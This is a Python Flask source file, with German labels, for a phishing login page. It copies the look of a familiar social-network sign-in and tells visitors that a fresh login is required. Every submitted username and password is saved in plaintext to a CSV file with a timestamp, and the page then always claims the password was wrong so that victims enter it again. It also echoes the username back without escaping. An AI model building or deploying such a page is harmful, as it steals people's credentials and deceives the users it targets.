from flask import Flask, request
import csv
from datetime import datetime
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    benutzername = ""

    if request.method == "POST":
        benutzername = request.form.get("username", "")
        passwort = request.form.get("password", "")
        zeit = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        file_exists = os.path.isfile("zugangsdaten.csv")
        try:
            with open("zugangsdaten.csv", "a", newline='', encoding='utf-8') as csvfile:
                writer = csv.writer(csvfile)
                if not file_exists:
                    writer.writerow(["Datum", "Benutzername", "Passwort (Klartext)"])
                writer.writerow(["Datum:           " + zeit])
                writer.writerow(["Benutzername:    " + benutzername])
                writer.writerow(["Passwort:        " + passwort])
                writer.writerow(["------------------------------------"])
        except Exception as e:
            return f"Fehler beim Schreiben in CSV: {e}"

        return '''
            <div style="text-align:center; font-family:sans-serif; margin-top:100px;">
                <h2 style="font-size:24px; margin-bottom:30px;">❌ Passwort ist nicht korrekt – bitte erneut versuchen </h2>
                <a href="/" style="text-decoration:none; color:#007BFF; font-size:18px;">Zurück zur Login-Seite</a>
            </div>
        '''

    return f'''
    <!DOCTYPE html>
    <html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Yasan – Anmeldung</title>
        <style>
            html, body {{
                height: 100%;
                margin: 0;
                padding: 0;
                font-family: Helvetica, Arial, sans-serif;
                background-color: #f0f2f5;
                display: flex;
                justify-content: center;
                align-items: center;
            }}

            .login-wrapper {{
                width: 90%;
                max-width: 400px;
                background: #fff;
                padding: 30px 20px;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                display: flex;
                flex-direction: column;
                align-items: center;
            }}

            .titel {{
                font-size: 24px;
                font-weight: bold;
                margin-bottom: 10px;
                text-align: center;
            }}

            .hinweis {{
                font-size: 14px;
                color: #606770;
                text-align: center;
                margin-bottom: 20px;
            }}

            form {{
                width: 100%;
                display: flex;
                flex-direction: column;
                align-items: center;
            }}

            input[type="text"],
            input[type="password"] {{
                width: 100%;
                padding: 12px;
                margin-bottom: 12px;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                background-color: #f5f6f7;
                font-size: 16px;
            }}

            input[type="submit"] {{
                width: 100%;
                padding: 12px;
                background-color: #1877f2;
                border: none;
                border-radius: 6px;
                color: white;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
            }}

            input[type="submit"]:hover {{
                background-color: #165cdb;
            }}

            @media (max-height: 500px) {{
                .login-wrapper {{
                    margin-top: 20px;
                    margin-bottom: 20px;
                }}
            }}
        </style>
    </head>

    <body>
        <div class="login-wrapper">
            <p class="hinweis">Hallo, eine erneute Anmeldung auf meiner Seite ist erforderlich</p>
            <h2 class="titel">Login auf meiner Seite</h2>

            <form method="post">
                <input name="username" type="text" placeholder="Benutzername" value="{benutzername}" required>
                <input name="password" type="password" placeholder="Passwort" required>
                <input type="submit" value="Einloggen">
            </form>
        </div>
    </body>
    </html>
    '''
